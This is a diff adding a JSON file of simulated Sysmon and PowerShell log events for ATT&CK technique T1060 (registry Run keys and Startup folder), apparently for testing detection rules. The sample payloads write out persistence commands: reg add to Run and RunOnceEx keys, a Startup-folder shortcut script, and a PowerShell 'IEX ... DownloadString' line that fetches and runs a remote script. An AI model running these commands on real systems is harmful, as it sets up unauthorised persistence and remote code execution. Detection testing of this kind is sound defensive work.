@@ -1,0 +1,94 @@
+{
+	"name": "T1060 - Registry Run Keys / Start Folder",
+	"version": "0.1",
+	"author": "n0dec",
+	"description": "Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots.",
+	"rules": {
+		"run_add": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Process Create",
+			"description": "Writing Run persistence key.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\reg.exe",
+				"Description": "Registry Console Tool",
+				"CommandLine": "reg  add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"T1056\" /t REG_SZ /F /D \"C:\\T1056.exe\""
+			}
+		},
+		"run_value": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Registry value set",
+			"description": "Writing Run persistence key.",
+			"payload": {
+				"EventType": "SetValue",
+				"Image": "C:\\Windows\\system32\\reg.exe",
+				"TargetObject": "HKU\\S-1-5-21-3162150815-438046626-91849468-500\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\T1056",
+				"Details": "C:\\T1056.exe"
+			}
+		},
+		"runonceex_add": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Process Create",
+			"description": "Writing run persistence key.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\reg.exe",
+				"Description": "Registry Console Tool",
+				"CommandLine": "reg  add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\T1056.exe\""
+			}
+		},
+		"runonceex_value": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Registry value set",
+			"description": "Writing RunOnceEx persistence key.",
+			"payload": {
+				"EventType": "SetValue",
+				"Image": "C:\\Windows\\system32\\reg.exe",
+				"TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend\\1",
+				"Details": "C:\\T1056.exe"
+			}
+		},
+		"powershell_runonce": {
+			"enabled": true,
+			"source": "PowerShell",
+			"category": "4104",
+			"description": "Writing RunOnce persistence key with powershell.",
+			"payload": {
+				"ScriptBlockText": "set-itemproperty $RunOnceKey \"NextRun\" 'powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Discovery.bat`\")\"'"
+			}
+		},
+		"runonce_value": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Registry value set",
+			"description": "Writing RunOnceEx persistence key.",
+			"payload": {
+				"EventType": "SetValue",
+				"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+				"TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\NextRun",
+				"Details": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Discovery.bat`\")\""
+			}
+		},
+		"powershell_shortcut": {
+			"enabled": true,
+			"source": "PowerShell",
+			"category": "4104",
+			"description": "Writing shortcut file in StartUp folder.",
+			"payload": {
+				"ScriptBlockText": "$TargetFile = \"$env:SystemRoot\\System32\\cmd.exe\"\r\n$ShortcutFile = \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Notepad.lnk\"\r\n$WScriptShell = New-Object -ComObject WScript.Shell\r\n$Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)\r\n$Shortcut.TargetPath = $TargetFile\r\n$Shortcut.Save()"
+			}
+		},
+		"shortcut_file": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "File created",
+			"description": "Writing shortcut file in StartUp folder.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+				"TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Notepad.lnk"
+			}
+		}
+	}
+}
